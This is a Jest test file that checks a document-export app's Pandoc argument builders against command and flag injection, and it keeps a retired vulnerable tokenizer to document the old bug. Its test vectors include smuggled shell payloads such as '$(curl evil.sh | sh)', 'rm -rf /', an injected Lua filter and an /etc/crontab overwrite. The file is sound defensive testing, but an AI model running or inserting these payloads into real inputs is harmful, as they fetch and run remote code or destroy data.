/**
 * Security and regression tests for the Pandoc argument builders (SEC-1).
 *
 * Pandoc must always be invoked as execFile(pandocPath, args) with an argument
 * array — never a shell-style command string that gets re-tokenized. These
 * tests prove that user-controlled values (file paths, template names,
 * metadata, footer text) can only ever arrive as single literal argv elements,
 * and pin the argument shape of every export format to its pre-conversion
 * behavior.
 */
const PandocArgs = require('../../src/main/PandocArgs');

const {
  SIMPLE_TARGET_FORMATS,
  appendCommonOptions,
  appendFooterVariable,
  appendPdfEngineOptions,
  buildPandocArgs,
  buildSimpleTargetArgs,
} = PandocArgs;

/**
 * Verbatim copy of the retired main.js tokenizer (removed with the fix).
 * parseCommand had no escape handling, so any value containing a quote
 * character split into multiple argv elements. Kept here only to prove the
 * old path was exploitable and to pin the new arrays against the old output
 * for benign input.
 */
function retiredParseCommand(cmdString) {
  const parts = [];
  let current = '';
  let inQuotes = false;
  let quoteChar = '';
  for (let i = 0; i < cmdString.length; i++) {
    const char = cmdString[i];
    if ((char === '"' || char === "'") && !inQuotes) {
      inQuotes = true;
      quoteChar = char;
    } else if (char === quoteChar && inQuotes) {
      inQuotes = false;
      quoteChar = '';
    } else if (char === ' ' && !inQuotes) {
      if (current) {
        parts.push(current);
        current = '';
      }
    } else {
      current += char;
    }
  }
  if (current) {
    parts.push(current);
  }
  return { command: parts[0], args: parts.slice(1) };
}

// Asserts that `value` arrives in argv as exactly one literal element (if the
// value were split or re-interpreted, no element would equal it) and that no
// injected flag ever becomes its own argv element.
function expectSingleLiteralArg(args, value, ...injectedFragments) {
  expect(args.filter((a) => a === value)).toHaveLength(1);
  for (const fragment of injectedFragments) {
    expect(args).not.toContain(fragment);
  }
}

describe('PandocArgs injection resistance (SEC-1)', () => {
  const maliciousVectors = [
    '/tmp/x.bib" --lua-filter=/tmp/evil.lua -o "/tmp/x.bib',
    '/home/u/notes; rm -rf /',
    '/tmp/$(curl evil.sh | sh)',
    '/tmp/`wget evil.sh`',
    '/tmp/my file with spaces.bib',
    "/tmp/it's-quoted.bib",
    '/tmp/trailing\\backslash.bib"',
  ];

  describe.each([
    [
      'bibliography',
      (options) => buildPandocArgs({ inputFile: '/in.md', outputFile: '/out.pdf', options }),
    ],
    ['csl', (options) => buildPandocArgs({ inputFile: '/in.md', outputFile: '/out.pdf', options })],
    [
      'template',
      (options) => buildPandocArgs({ inputFile: '/in.md', outputFile: '/out.pdf', options }),
    ],
  ])('%s cannot inject extra pandoc flags', (field, build) => {
    test.each(maliciousVectors)('value %j stays one literal argv element', (vector) => {
      const args = build({ [field]: vector });
      expectSingleLiteralArg(
        args,
        `--${field}=${vector}`,
        '--lua-filter=/tmp/evil.lua',
        'rm',
        '-rf',
        '--filter'
      );
      expect(args.slice(0, 2)).toEqual(['/in.md', '-o']);
      expect(args.filter((a) => a === '/out.pdf')).toHaveLength(1);
    });
  });

  test('metadata values cannot inject extra pandoc flags', () => {
    const vector = 'title"; --lua-filter=/tmp/evil.lua; rm -rf /';
    const args = buildPandocArgs({
      inputFile: '/in.md',
      outputFile: '/out.pdf',
      options: { metadata: { title: vector, author: 'Jane Doe' } },
    });
    expectSingleLiteralArg(args, `title=${vector}`, '--lua-filter=/tmp/evil.lua', 'rm', '-rf');
    expect(args).toContain('-M');
    expect(args).toContain('author=Jane Doe');
  });

  test('metadata keys cannot inject extra pandoc flags', () => {
    const key = 'title" --lua-filter=/tmp/evil.lua';
    const args = buildPandocArgs({
      inputFile: '/in.md',
      outputFile: '/out.pdf',
      options: { metadata: { [key]: 'value' } },
    });
    expectSingleLiteralArg(args, `${key}=value`, '--lua-filter=/tmp/evil.lua');
  });

  test('variable values cannot inject extra pandoc flags', () => {
    const vector = 'margin=1in" --lua-filter=/tmp/evil.lua';
    const args = buildPandocArgs({
      inputFile: '/in.md',
      outputFile: '/out.pdf',
      options: { variables: { geometry: vector } },
    });
    expectSingleLiteralArg(args, `geometry=${vector}`, '--lua-filter=/tmp/evil.lua');
    expect(args).toContain('-V');
  });

  test('input and output paths cannot inject extra pandoc flags or change position', () => {
    const input = '/tmp/my doc; rm -rf / $(evil) `evil`.md';
    const output = '/tmp/out put"; --lua-filter=/tmp/evil.lua.pdf';
    const args = buildPandocArgs({ inputFile: input, outputFile: output });
    expect(args[0]).toBe(input);
    expect(args[1]).toBe('-o');
    expect(args[2]).toBe(output);
    expect(args).toHaveLength(3);
    expect(args).not.toContain('--lua-filter=/tmp/evil.lua');
    expect(args).not.toContain('rm');
  });

  test('pdf engine and geometry values cannot inject extra pandoc flags', () => {
    const args = [];
    appendPdfEngineOptions(args, {
      pdfEngine: 'xelatex" --lua-filter=/tmp/evil.lua',
      geometry: 'margin=1in"; -o /etc/crontab',
    });
    expectSingleLiteralArg(
      args,
      '--pdf-engine=xelatex" --lua-filter=/tmp/evil.lua',
      '--lua-filter=/tmp/evil.lua',
      '-o'
    );
    expectSingleLiteralArg(args, 'geometry:margin=1in"; -o /etc/crontab', '-o', '/etc/crontab');
  });

  test('pptx footer text cannot inject extra pandoc flags', () => {
    const vector = 'Page 1"; --lua-filter=/tmp/evil.lua';
    const args = [];
    appendFooterVariable(args, vector);
    expect(args).toEqual(['--variable', `footer=${vector}`]);
  });

  test('the retired string+parseCommand path DID split a malicious value (documents the bug)', () => {
    const malicious = '/tmp/x.bib" --lua-filter=/tmp/evil.lua -o "/tmp/x.bib';
    const oldCommand = `pandoc "/in.md" -o "/out.pdf" --bibliography="${malicious}"`;
    const { args } = retiredParseCommand(oldCommand);
    expect(args).toContain('--lua-filter=/tmp/evil.lua');
    expect(args).not.toContain(`--bibliography=${malicious}`);
    // The new builder neutralizes the same vector.
    const safeArgs = buildPandocArgs({
      inputFile: '/in.md',
      outputFile: '/out.pdf',
      options: { bibliography: malicious },
    });
    expect(safeArgs).not.toContain('--lua-filter=/tmp/evil.lua');
    expectSingleLiteralArg(safeArgs, `--bibliography=${malicious}`, '--lua-filter=/tmp/evil.lua');
  });
});

describe('PandocArgs regression pins (benign input, pre-conversion argv)', () => {
  const benignOptions = {
    template: '/templates/report.tex',
    metadata: { title: 'My Report', author: 'Jane Doe' },
    variables: { geometry: 'margin=1in', fontsize: '12pt' },
    toc: true,
    tocDepth: 3,
    numberSections: true,
    citeproc: true,
    bibliography: '/refs/refs.bib',
    csl: '/styles/ieee.csl',
  };

  // Rebuilds the exact command string the export dialog used to produce for a
  // benign option set, then tokenizes it with the retired parser.
  function oldDialogArgs(format) {
    let pandocCmd = `pandoc "/in.md" -o "/out.${format}"`;
    if (benignOptions.template && benignOptions.template !== 'default') {
      pandocCmd += ` --template="${benignOptions.template}"`;
    }
    for (const [key, value] of Object.entries(benignOptions.metadata)) {
      if (value.trim()) pandocCmd += ` -M ${key}="${value.replace(/"/g, '\\"')}"`;
    }
    for (const [key, value] of Object.entries(benignOptions.variables)) {
      if (value.trim()) pandocCmd += ` -V ${key}="${value.replace(/"/g, '\\"')}"`;
    }
    if (benignOptions.toc) pandocCmd += ' --toc';
    if (benignOptions.tocDepth) pandocCmd += ` --toc-depth=${benignOptions.tocDepth}`;
    if (benignOptions.numberSections) pandocCmd += ' --number-sections';
    if (benignOptions.citeproc) pandocCmd += ' --citeproc';
    if (benignOptions.bibliography) pandocCmd += ` --bibliography="${benignOptions.bibliography}"`;
    if (benignOptions.csl) pandocCmd += ` --csl="${benignOptions.csl}"`;
    if (format === 'docx') pandocCmd += ' -t docx';
    return retiredParseCommand(pandocCmd).args;
  }

  test.each(['docx', 'rtf', 'pdf', 'pptx', 'epub', 'odt'])(
    'format %s produces the same argv as the retired string path for a benign option set',
    (format) => {
      const args = buildPandocArgs({
        inputFile: '/in.md',
        outputFile: `/out.${format}`,
        format,
        options: benignOptions,
      });
      expect([...args].sort()).toEqual(oldDialogArgs(format).sort());
    }
  );

  test('buildPandocArgs docx with full options (exact argv pin)', () => {
    const args = buildPandocArgs({
      inputFile: '/in.md',
      outputFile: '/out.docx',
      format: 'docx',
      options: benignOptions,
    });
    expect(args).toEqual([
      '/in.md',
      '-o',
      '/out.docx',
      '--template=/templates/report.tex',
      '-M',
      'title=My Report',
      '-M',
      'author=Jane Doe',
      '-V',
      'geometry=margin=1in',
      '-V',
      'fontsize=12pt',
      '--toc',
      '--toc-depth=3',
      '--number-sections',
      '--citeproc',
      '--bibliography=/refs/refs.bib',
      '--csl=/styles/ieee.csl',
      '-t',
      'docx',
    ]);
  });

  test('buildPandocArgs minimal options for a generic format (exact argv pin)', () => {
    const args = buildPandocArgs({ inputFile: '/a b.md', outputFile: '/out.rtf', format: 'rtf' });
    expect(args).toEqual(['/a b.md', '-o', '/out.rtf']);
  });

  test.each(Object.entries(SIMPLE_TARGET_FORMATS))(
    'simple target format %j converts to -t %s and drops dialog options (pre-existing behavior)',
    (format, target) => {
      const args = buildSimpleTargetArgs('/in.md', '/out.file', format);
      expect(args).toEqual(['/in.md', '-t', target, '-o', '/out.file']);
      // Dialog options were never applied to these formats before the fix.
      expect(args).not.toContain('--toc');
    }
  );

  test('simple target formats cover the seven formats added in the export expansion', () => {
    for (const format of ['asciidoc', 'rst', 'mediawiki', 'org', 'textile', 'man', 'ipynb']) {
      expect(SIMPLE_TARGET_FORMATS[format]).toBe(format);
    }
  });

  test('buildSimpleTargetArgs returns null for formats with bespoke handling', () => {
    for (const format of ['pdf', 'docx', 'html', 'epub', 'revealjs', 'rtf']) {
      expect(buildSimpleTargetArgs('/in.md', '/out.x', format)).toBeNull();
    }
  });

  test('appendCommonOptions skips default template and blank metadata/variable values', () => {
    const args = [];
    appendCommonOptions(args, {
      template: 'default',
      metadata: { title: '  ', author: 'Kept' },
      variables: { margin: '' },
    });
    expect(args).toEqual(['-M', 'author=Kept']);
  });

  test('appendCommonOptions tolerates missing options object', () => {
    const args = ['/in.md', '-o', '/out.pdf'];
    appendCommonOptions(args, undefined);
    expect(args).toEqual(['/in.md', '-o', '/out.pdf']);
  });

  test('appendPdfEngineOptions defaults to xelatex and adds geometry when set', () => {
    const withDefaults = [];
    appendPdfEngineOptions(withDefaults);
    expect(withDefaults).toEqual(['--pdf-engine=xelatex']);

    const full = [];
    appendPdfEngineOptions(full, { pdfEngine: 'lualatex', geometry: 'margin=1in' });
    expect(full).toEqual(['--pdf-engine=lualatex', '-V', 'geometry:margin=1in']);
  });

  test('appendFooterVariable is a no-op without footer text', () => {
    const args = [];
    appendFooterVariable(args, '');
    appendFooterVariable(args, undefined);
    expect(args).toEqual([]);
  });
});
